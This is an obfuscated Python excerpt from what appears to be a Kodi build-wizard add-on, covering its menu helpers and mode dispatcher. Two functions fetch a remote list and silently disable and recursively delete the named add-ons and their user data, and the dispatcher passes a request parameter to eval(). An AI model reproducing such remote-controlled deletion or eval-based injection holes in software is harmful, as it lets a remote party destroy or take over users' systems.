def addFile (OOOOO0O000000O0OO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5081
	OO000O00O00O00O0O =sys .argv [0 ]#line:5082
	if not mode ==None :OO000O00O00O00O0O +="?mode=%s"%urllib .quote_plus (mode )#line:5083
	if not name ==None :OO000O00O00O00O0O +="&name="+urllib .quote_plus (name )#line:5084
	if not url ==None :OO000O00O00O00O0O +="&url="+urllib .quote_plus (url )#line:5085
	O0OOO00000OO00O0O =True #line:5086
	if themeit :OOOOO0O000000O0OO =themeit %OOOOO0O000000O0OO #line:5087
	OOO00O0OOO0OO0O00 =xbmcgui .ListItem (OOOOO0O000000O0OO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5088
	OOO00O0OOO0OO0O00 .setInfo (type ="Video",infoLabels ={"Title":OOOOO0O000000O0OO ,"Plot":description })#line:5089
	OOO00O0OOO0OO0O00 .setProperty ("Fanart_Image",fanart )#line:5090
	if not menu ==None :OOO00O0OOO0OO0O00 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5091
	O0OOO00000OO00O0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO000O00O00O00O0O ,listitem =OOO00O0OOO0OO0O00 ,isFolder =False )#line:5092
	return O0OOO00000OO00O0O #line:5093
def get_params ():#line:5095
	OOO000OOOO000OOO0 =[]#line:5096
	OOOOO00O0O0O0O000 =sys .argv [2 ]#line:5097
	if len (OOOOO00O0O0O0O000 )>=2 :#line:5098
		O0OO00OO0O00O0O0O =sys .argv [2 ]#line:5099
		O0O00OO000OO0OOOO =O0OO00OO0O00O0O0O .replace ('?','')#line:5100
		if (O0OO00OO0O00O0O0O [len (O0OO00OO0O00O0O0O )-1 ]=='/'):#line:5101
			O0OO00OO0O00O0O0O =O0OO00OO0O00O0O0O [0 :len (O0OO00OO0O00O0O0O )-2 ]#line:5102
		OOOO00OO000OO00O0 =O0O00OO000OO0OOOO .split ('&')#line:5103
		OOO000OOOO000OOO0 ={}#line:5104
		for OO0000O0OO0OO0O0O in range (len (OOOO00OO000OO00O0 )):#line:5105
			OOOO0OOOO0OO0OO00 ={}#line:5106
			OOOO0OOOO0OO0OO00 =OOOO00OO000OO00O0 [OO0000O0OO0OO0O0O ].split ('=')#line:5107
			if (len (OOOO0OOOO0OO0OO00 ))==2 :#line:5108
				OOO000OOOO000OOO0 [OOOO0OOOO0OO0OO00 [0 ]]=OOOO0OOOO0OO0OO00 [1 ]#line:5109
		return OOO000OOOO000OOO0 #line:5111
def remove_addons ():#line:5113
	try :#line:5114
			import json #line:5115
			O000OOOOO0O0O000O =urllib2 .urlopen (remove_url ).readlines ()#line:5116
			for O0OO0OOOO00OO0OOO in O000OOOOO0O0O000O :#line:5117
				OOO000O00O000O00O =O0OO0OOOO00OO0OOO .split (':')[1 ].strip ()#line:5119
				O000OOOO0O00OOO00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OOO000O00O000O00O ,'false')#line:5120
				OO0000OOO0OO0O0O0 =xbmc .executeJSONRPC (O000OOOO0O00OOO00 )#line:5121
				O0O000OO00000000O =json .loads (OO0000OOO0OO0O0O0 )#line:5122
				O0O0OO0OOOO00OOO0 =os .path .join (addons_folder ,OOO000O00O000O00O )#line:5124
				if os .path .exists (O0O0OO0OOOO00OOO0 ):#line:5126
					for OOO0O000000OOO0OO ,OO000O0O000OO0OOO ,OOO0O0OOOOOOOO0OO in os .walk (O0O0OO0OOOO00OOO0 ):#line:5127
						for O00000O0000OOO0O0 in OOO0O0OOOOOOOO0OO :#line:5128
							os .unlink (os .path .join (OOO0O000000OOO0OO ,O00000O0000OOO0O0 ))#line:5129
						for O0OOOOO00000OO000 in OO000O0O000OO0OOO :#line:5130
							shutil .rmtree (os .path .join (OOO0O000000OOO0OO ,O0OOOOO00000OO000 ))#line:5131
					os .rmdir (O0O0OO0OOOO00OOO0 )#line:5132
			xbmc .executebuiltin ('Container.Refresh')#line:5134
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5135
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5136
	except :pass #line:5137
def remove_addons2 ():#line:5138
	try :#line:5139
			import json #line:5140
			OOO0O0OOOO0O0OOO0 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5141
			for OOOOOOO000OO0OO00 in OOO0O0OOOO0O0OOO0 :#line:5142
				O00O0O000OOOO0000 =OOOOOOO000OO0OO00 .split (':')[1 ].strip ()#line:5144
				OOO000O0000O00O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O00O0O000OOOO0000 ,'false')#line:5145
				O0OO000O0000O0OO0 =xbmc .executeJSONRPC (OOO000O0000O00O0O )#line:5146
				O0O000O0OOOO000OO =json .loads (O0OO000O0000O0OO0 )#line:5147
				OO00000000O000OOO =os .path .join (user_folder ,O00O0O000OOOO0000 )#line:5149
				if os .path .exists (OO00000000O000OOO ):#line:5151
					for O00O0OOO0O0OO0000 ,O00000OO000O0O00O ,OO0O0O00O0O0OOOO0 in os .walk (OO00000000O000OOO ):#line:5152
						for OOOO0O0OO0O0OOO0O in OO0O0O00O0O0OOOO0 :#line:5153
							os .unlink (os .path .join (O00O0OOO0O0OO0000 ,OOOO0O0OO0O0OOO0O ))#line:5154
						for O0O0OO0O0O000O0O0 in O00000OO000O0O00O :#line:5155
							shutil .rmtree (os .path .join (O00O0OOO0O0OO0000 ,O0O0OO0O0O000O0O0 ))#line:5156
					os .rmdir (OO00000000O000OOO )#line:5157
	except :pass #line:5159
params =get_params ()#line:5160
url =None #line:5161
name =None #line:5162
mode =None #line:5163
try :mode =urllib .unquote_plus (params ["mode"])#line:5165
except :pass #line:5166
try :name =urllib .unquote_plus (params ["name"])#line:5167
except :pass #line:5168
try :url =urllib .unquote_plus (params ["url"])#line:5169
except :pass #line:5170
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5172
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5173
def setView (OOO000OOOOO0O0OOO ,OO0000O00O0O0O000 ):#line:5174
	if wiz .getS ('auto-view')=='true':#line:5175
		O00OOOO00OO0OOOO0 =wiz .getS (OO0000O00O0O0O000 )#line:5176
		if O00OOOO00OO0OOOO0 =='50'and KODIV >=17 and SKIN =='skin.estuary':O00OOOO00OO0OOOO0 ='55'#line:5177
		if O00OOOO00OO0OOOO0 =='500'and KODIV >=17 and SKIN =='skin.estuary':O00OOOO00OO0OOOO0 ='50'#line:5178
		wiz .ebi ("Container.SetViewMode(%s)"%O00OOOO00OO0OOOO0 )#line:5179
if mode ==None :index ()#line:5181
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5183
elif mode =='builds':buildMenu ()#line:5184
elif mode =='viewbuild':viewBuild (name )#line:5185
elif mode =='buildinfo':buildInfo (name )#line:5186
elif mode =='buildpreview':buildVideo (name )#line:5187
elif mode =='install':buildWizard (name ,url )#line:5188
elif mode =='theme':buildWizard (name ,mode ,url )#line:5189
elif mode =='viewthirdparty':viewThirdList (name )#line:5190
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5191
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5192
elif mode =='maint':maintMenu (name )#line:5194
elif mode =='passpin':passandpin ()#line:5195
elif mode =='backmyupbuild':backmyupbuild ()#line:5196
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5197
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5198
elif mode =='advancedsetting':advancedWindow (name )#line:5199
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5200
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5201
elif mode =='asciicheck':wiz .asciiCheck ()#line:5202
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5203
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5204
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5205
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5206
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5207
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5208
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5209
elif mode =='currentsettings':viewAdvanced ()#line:5210
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5211
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5212
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5213
elif mode =='fixskin':backtokodi ()#line:5214
elif mode =='testcommand':testcommand ()#line:5215
elif mode =='logsend':logsend ()#line:5216
elif mode =='rdon':rdon ()#line:5217
elif mode =='rdoff':rdoff ()#line:5218
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5219
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5220
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5221
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5222
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5223
elif mode =='freshstart':freshStart ()#line:5224
elif mode =='forceupdate':wiz .forceUpdate ()#line:5225
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5226
elif mode =='forceclose':wiz .killxbmc ()#line:5227
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5228
elif mode =='hidepassword':wiz .hidePassword ()#line:5229
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5230
elif mode =='enableaddons':enableAddons ()#line:5231
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5232
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5233
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5234
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5235
elif mode =='uploadlog':uploadLog .Main ()#line:5236
elif mode =='viewlog':LogViewer ()#line:5237
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5238
elif mode =='viewerrorlog':errorChecking (all =True )#line:5239
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5240
elif mode =='purgedb':purgeDb ()#line:5241
elif mode =='fixaddonupdate':fixUpdate ()#line:5242
elif mode =='removeaddons':removeAddonMenu ()#line:5243
elif mode =='removeaddon':removeAddon (name )#line:5244
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5245
elif mode =='removedata':removeAddonData (name )#line:5246
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5247
elif mode =='systeminfo':systemInfo ()#line:5248
elif mode =='restorezip':restoreit ('build')#line:5249
elif mode =='restoregui':restoreit ('gui')#line:5250
elif mode =='restoreaddon':restoreit ('addondata')#line:5251
elif mode =='restoreextzip':restoreextit ('build')#line:5252
elif mode =='restoreextgui':restoreextit ('gui')#line:5253
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5254
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5255
elif mode =='apk':apkMenu (name )#line:5257
elif mode =='apkscrape':apkScraper (name )#line:5258
elif mode =='apkinstall':apkInstaller (name ,url )#line:5259
elif mode =='speed':speedMenu ()#line:5260
elif mode =='net':net_tools ()#line:5261
elif mode =='GetList':GetList (url )#line:5262
elif mode =='youtube':youtubeMenu (name )#line:5263
elif mode =='viewVideo':playVideo (url )#line:5264
elif mode =='addons':addonMenu (name )#line:5266
elif mode =='addoninstall':addonInstaller (name ,url )#line:5267
elif mode =='savedata':saveMenu ()#line:5269
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5270
elif mode =='managedata':manageSaveData (name )#line:5271
elif mode =='whitelist':wiz .whiteList (name )#line:5272
elif mode =='trakt':traktMenu ()#line:5274
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5275
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5276
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5277
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5278
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5279
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5280
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5281
elif mode =='realdebrid':realMenu ()#line:5283
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5284
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5285
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5286
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5287
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5288
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5289
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5290
elif mode =='login':loginMenu ()#line:5292
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5293
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5294
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5295
elif mode =='clearlogin':loginit .clearSaved (name )#line:5296
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5297
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5298
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5299
elif mode =='contact':notify .contact (CONTACT )#line:5301
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5302
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5303
elif mode =='developer':developer ()#line:5305
elif mode =='converttext':wiz .convertText ()#line:5306
elif mode =='createqr':wiz .createQR ()#line:5307
elif mode =='testnotify':testnotify ()#line:5308
elif mode =='testnotify2':testnotify2 ()#line:5309
elif mode =='servicemanual':servicemanual ()#line:5310
elif mode =='fastinstall':fastinstall ()#line:5311
elif mode =='testupdate':testupdate ()#line:5312
elif mode =='testfirst':testfirst ()#line:5313
elif mode =='testfirstrun':testfirstRun ()#line:5314
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5315
elif mode =='bg':wiz .bg_install (name ,url )#line:5317
elif mode =='bgcustom':wiz .bg_custom ()#line:5318
elif mode =='bgremove':wiz .bg_remove ()#line:5319
elif mode =='bgdefault':wiz .bg_default ()#line:5320
elif mode =='rdset':rdsetup ()#line:5321
elif mode =='mor':morsetup ()#line:5322
elif mode =='mor2':morsetup2 ()#line:5323
elif mode =='resolveurl':resolveurlsetup ()#line:5324
elif mode =='urlresolver':urlresolversetup ()#line:5325
elif mode =='forcefastupdate':forcefastupdate ()#line:5326
elif mode =='traktset':traktsetup ()#line:5327
elif mode =='placentaset':placentasetup ()#line:5328
elif mode =='flixnetset':flixnetsetup ()#line:5329
elif mode =='reptiliaset':reptiliasetup ()#line:5330
elif mode =='yodasset':yodasetup ()#line:5331
elif mode =='numbersset':numberssetup ()#line:5332
elif mode =='uranusset':uranussetup ()#line:5333
elif mode =='genesisset':genesissetup ()#line:5334
elif mode =='fastupdate':fastupdate ()#line:5335
elif mode =='folderback':folderback ()#line:5336
elif mode =='menudata':Menu ()#line:5337
elif mode ==2 :#line:5339
        wiz .torent_menu ()#line:5340
elif mode ==3 :#line:5341
        wiz .popcorn_menu ()#line:5342
elif mode ==8 :#line:5343
        wiz .metaliq_fix ()#line:5344
elif mode ==9 :#line:5345
        wiz .quasar_menu ()#line:5346
elif mode ==5 :#line:5347
        swapSkins ('skin.Premium.mod')#line:5348
elif mode ==13 :#line:5349
        wiz .elementum_menu ()#line:5350
elif mode ==16 :#line:5351
        wiz .fix_wizard ()#line:5352
elif mode ==17 :#line:5353
        wiz .last_play ()#line:5354
elif mode ==18 :#line:5355
        wiz .normal_metalliq ()#line:5356
elif mode ==19 :#line:5357
        wiz .fast_metalliq ()#line:5358
elif mode ==20 :#line:5359
        wiz .fix_buffer2 ()#line:5360
elif mode ==21 :#line:5361
        wiz .fix_buffer3 ()#line:5362
elif mode ==11 :#line:5363
        wiz .fix_buffer ()#line:5364
elif mode ==15 :#line:5365
        wiz .fix_font ()#line:5366
elif mode ==14 :#line:5367
        wiz .clean_pass ()#line:5368
elif mode ==22 :#line:5369
        wiz .movie_update ()#line:5370
elif mode =='adv_settings':buffer1 ()#line:5371
elif mode =='getpass':getpass ()#line:5372
elif mode =='setpass':setpass ()#line:5373
elif mode =='setuname':setuname ()#line:5374
elif mode =='passandUsername':passandUsername ()#line:5375
elif mode =='9':disply_hwr ()#line:5376
elif mode =='99':disply_hwr2 ()#line:5377
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))